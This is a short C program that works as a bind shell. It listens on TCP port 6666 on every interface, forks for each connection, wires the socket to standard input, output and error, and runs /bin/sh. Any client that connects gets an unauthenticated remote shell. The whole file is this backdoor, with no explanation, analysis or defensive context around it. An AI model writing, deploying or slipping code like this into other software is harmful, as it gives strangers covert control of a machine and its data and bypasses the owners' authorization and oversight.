#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <error.h>
#include <unistd.h>
#include <arpa/inet.h>
int main(int argc, char *argv[])
{
    int socket_fd, len, ret,client_fd;
    struct sockaddr_in server_addr,client_addr;
    socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(socket_fd < 0)
    {
        perror("error for socket");
        exit(-1);
    }
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(6666);    //the listen port
    server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    if((ret = bind(socket_fd, (struct sockaddr*)&server_addr, sizeof(server_addr))))
    {
        perror("error for bind");
        exit(-1);
    }
    if((ret = listen(socket_fd, 10)))
    {
        perror("error for listen");
        exit(-1);
    }
    len = sizeof(struct sockaddr);
    while(1)
    {
        client_fd = accept(socket_fd, (struct sockaddr*)&client_addr, &len);
        if(client_fd < 0)
        {
            perror("error for accept");
            exit(-1);
        }
        if(fork() == 0)
        {
            printf("welcome\n");
            dup2(client_fd, 0);
            dup2(client_fd, 1);
            dup2(client_fd, 2);
            execl("/bin/sh", "sh", (char*)0);
        }
    }
    close(socket_fd);
    return 0;
}
